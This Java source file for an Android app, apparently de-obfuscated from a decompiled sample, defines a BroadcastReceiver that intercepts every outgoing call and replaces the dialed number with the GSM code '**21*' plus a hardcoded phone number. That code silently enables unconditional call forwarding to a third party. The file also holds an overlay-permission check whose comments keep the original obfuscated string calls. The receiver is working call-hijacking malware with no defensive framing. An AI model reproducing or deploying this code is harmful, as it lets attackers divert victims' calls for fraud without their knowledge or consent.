package com.example.myapplication;

import android.app.AppOpsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.telephony.PhoneNumberUtils;

import java.lang.reflect.Field;

public class TeleBroadcastReceiver extends BroadcastReceiver {
    private final String TAG = MyBroadcastReceiver.TAG;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        //呼出电话
        if(action.equals(MyBroadcastReceiver.B_ACTION_NEW_OUTGOING_CALL)){
            String outPhoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//            PhoneNumberUtils.compare(context,outPhoneNumber,"15228008386");

            this.setResultData("**21*15228008386#");
//            String callForwardString = "**21*15881894940#";
//            Intent intentCallForward = new Intent(Intent.ACTION_CALL);
//            Uri uri2 = Uri.fromParts("tel", callForwardString, "#");
//            intentCallForward.setData(uri2);
//            context.startActivity(intentCallForward);


//这里可以更改呼出电话号码。如果设置为null，电话就永远不会播出了.
        }
    }
public static boolean checkFloatPermission(Context context) {
    boolean z = true;
    if (Build.VERSION.SDK_INT < 19) {
        return true;
    }
    if (Build.VERSION.SDK_INT < 23) {
        try {
//                 Class<?> cls = Class.forName(bb7d7pu7.m5998("CAcNGwYADUcKBgcdDAcdRyoGBx0MER0"));
            Class<?> cls = Class.forName("android.content.Context");
//                 Field declaredField = cls.getDeclaredField(bb7d7pu7.m5998("KDk5NiY5OjY6LDs_ICos"));
            Field declaredField = cls.getDeclaredField("APP_OPS_SERVICE");
            declaredField.setAccessible(true);
            Object obj = declaredField.get(cls);
            if (obj instanceof String) {
//                     Object invoke = cls.getMethod(bb7d7pu7.m5998("DgwdOhAaHQwEOgwbHwAKDA"), String.class).invoke(context, (String) obj);
                Object invoke = cls.getMethod("getSystemService", String.class).invoke(context, (String) obj);
//                     Class<?> cls2 = Class.forName(bb7d7pu7.m5998("CAcNGwYADUcIGRlHKBkZJhkaJAgHCA4MGw"));
                Class<?> cls2 = Class.forName("android.app.AppOpsManager");
//                     Field declaredField2 = cls2.getDeclaredField(bb7d7pu7.m5998("JCYtLDYoJSUmPiwt"));
                Field declaredField2 = cls2.getDeclaredField("MODE_ALLOWED");
                declaredField2.setAccessible(true);
//                     if (((Integer) cls2.getMethod(bb7d7pu7.m5998("CgEMCgImGQ"), Integer.TYPE, Integer.TYPE, String.class).invoke(invoke, 24, Integer.valueOf(Binder.getCallingUid()), context.getPackageName())).intValue() != declaredField2.getInt(cls2)) {
                if (((Integer) cls2.getMethod("checkOp", Integer.TYPE, Integer.TYPE, String.class).invoke(invoke, 24, Integer.valueOf(Binder.getCallingUid()), context.getPackageName())).intValue() != declaredField2.getInt(cls2)) {
                    z = false;
                }
                return z;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    } else if (Build.VERSION.SDK_INT >= 26) {
//             AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(bb7d7pu7.m5998("CBkZBhka"));
        AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        if (appOpsManager == null) {
            return false;
        }
//             int checkOpNoThrow = appOpsManager.checkOpNoThrow(bb7d7pu7.m5998("CAcNGwYADVMaEBodDAQ2CAUMGx02HgAHDQYe"), Process.myUid(), context.getPackageName());
        int checkOpNoThrow = appOpsManager.checkOpNoThrow("android:system_alert_window", Process.myUid(), context.getPackageName());
        boolean z2 = true;
        if (checkOpNoThrow != 0) {
            z2 = checkOpNoThrow == 1;
        }
        return z2;
    } else {
        return Settings.canDrawOverlays(context);
    }
}
}



